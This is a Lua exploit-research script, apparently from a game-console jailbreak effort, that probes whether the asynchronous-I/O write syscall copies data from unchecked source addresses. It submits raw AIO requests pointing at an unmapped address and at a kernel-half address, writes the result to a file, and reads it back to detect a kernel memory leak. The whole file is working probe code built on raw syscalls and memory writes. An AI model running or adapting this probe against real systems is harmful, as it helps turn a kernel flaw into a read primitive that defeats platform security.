-- CRASH_CLASS: HIGH
-- PROBE 352m: whether the write path copies from a source it never checked
--
-- 352l wrote to /dev/null with an unmapped and a kernel-half source and both
-- reported 0x10 bytes moved. That proves nothing on its own: /dev/null's write
-- routine discards the data without ever touching the buffer, so no copyin
-- happens and no check is reached.
--
-- A file is different - the bytes have to be fetched to be stored. This probe
-- writes to a file under /savedata0, reads it back, and compares. If a
-- kernel-half source lands its bytes in the file, the write path performs a
-- kernel read and hands the result to us.

print("=== PROBE 352m: AIO WRITE FROM AN UNCHECKED SOURCE ===")
print("")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, to_num(val)
end
local function sgn(v)
    local l = to_num(v)
    if l >= 0x80000000 then l = l - 0x100000000 end
    return l
end
local function hi_lo(v)
    local h, l = get_hi_lo(v)
    return to_num(h), to_num(l)
end
local Z = uint64(0)
local function sc(n) return make_syscall(n) end
local function wq(addr, value)
    pcall(function() memory.write_qword(addr, value) end)
end
local function wd(addr, value)
    pcall(function() memory.write_dword(addr, value) end)
end
local function rd(addr)
    local ok, v = pcall(function() return memory.read_dword(addr) end)
    if ok then return to_num(v) end
    return -999
end
local function put_str(s)
    local p = memory.alloc(#s + 2)
    for i = 1, #s do
        pcall(function() memory.write_byte(p + i - 1, string.byte(s, i)) end)
    end
    pcall(function() memory.write_byte(p + #s, 0) end)
    return p
end
local function open_path(path, flags, mode)
    local ok, rv = pcall(function()
        return sc(5)(put_str(path), uint64(flags), uint64(mode or 0))
    end)
    if not ok then return -1 end
    return sgn(rv)
end

local PATH = "/savedata0/aio352m.bin"
local reqs = memory.alloc(0x200)
local data = memory.alloc(0x1000)
local back = memory.alloc(0x1000)
local result = memory.alloc(0x200)
local ids = memory.alloc(0x200)
local states = memory.alloc(0x100)
for i = 0, 0x3F do
    wq(reqs + i * 8, 0)
    wd(result + i * 4, 0)
    wd(ids + i * 4, 0)
    wd(states + i * 4, 0)
end
for i = 0, 0x3FF do
    wd(data + i * 4, 0xCCCCCCCC)
    wd(back + i * 4, 0x11111111)
end

local function write_from(len, buf, fd)
    wq(reqs + 0x00, 0)
    wq(reqs + 0x08, len)
    local bh, bl = hi_lo(buf)
    wd(reqs + 0x10, bl) wd(reqs + 0x14, bh)
    local rh, rl = hi_lo(uint64(result))
    wd(reqs + 0x18, rl) wd(reqs + 0x1C, rh)
    wd(reqs + 0x20, fd)
    wd(reqs + 0x24, 0)
    wd(ids, 0)
    wd(result, 0)
    local ok1, r1 = pcall(function()
        return sc(669)(uint64(2), uint64(reqs), uint64(1), uint64(1), uint64(ids))
    end)
    local sub = ok1 and sgn(r1) or nil
    local id = rd(ids)
    if id and id ~= 0 then
        wd(states, 0)
        pcall(function() return sc(664)(uint64(ids), uint64(1), uint64(states)) end)
        wd(ids, id)
        pcall(function() return sc(662)(uint64(ids), uint64(1), uint64(states)) end)
    end
    return sub, rd(result)
end

local function read_back(n)
    local fd = open_path(PATH, 0, 0)
    if fd < 0 then
        print(string.format("  read_back: open failed (%d)", fd))
        return
    end
    for i = 0, 0x3F do wd(back + i * 4, 0x11111111) end
    local ok, rv = pcall(function() return sc(3)(uint64(fd), uint64(back), uint64(n), Z, Z, Z) end)
    local got = ok and sgn(rv) or -1
    local line = ""
    for i = 0, 3 do
        if i * 4 >= got then break end
        line = line .. string.format("%08X ", rd(back + i * 4))
    end
    print(string.format("  read %d bytes back: %s", got, line))
    pcall(function() return sc(6)(uint64(fd)) end)
end

print("[A] a control write of our own bytes")
local fd = open_path(PATH, 0x601, 438)
print(string.format("  open(O_CREAT|O_TRUNC|O_WRONLY) = %d", fd))
if fd < 0 then
    print("=== 352m DONE ===")
    return
end
local s, r = write_from(16, uint64(data), fd)
print(string.format("  cmd=2 data=ours   submit=%s result=0x%08X", tostring(s), r))
pcall(function() return sc(6)(uint64(fd)) end)
read_back(32)

print("[B] a source that is not mapped")
fd = open_path(PATH, 0x601, 438)
s, r = write_from(16, uint64(0x1000), fd)
print(string.format("  cmd=2 data=0x1000 submit=%s result=0x%08X", tostring(s), r))
pcall(function() return sc(6)(uint64(fd)) end)
read_back(32)

print("[C] a source in the kernel half")
fd = open_path(PATH, 0x601, 438)
s, r = write_from(16, uint64(string.format("0x%X%08X", 0xFFFF8000, 0x00000000)), fd)
print(string.format("  cmd=2 data=kernel submit=%s result=0x%08X", tostring(s), r))
pcall(function() return sc(6)(uint64(fd)) end)
read_back(32)

print("[D] the control again")
fd = open_path(PATH, 0x601, 438)
s, r = write_from(16, uint64(data), fd)
print(string.format("  cmd=2 data=ours   submit=%s result=0x%08X", tostring(s), r))
pcall(function() return sc(6)(uint64(fd)) end)
read_back(32)

pcall(function() return sc(10)(put_str(PATH)) end)
print("")
print("=== 352m DONE ===")
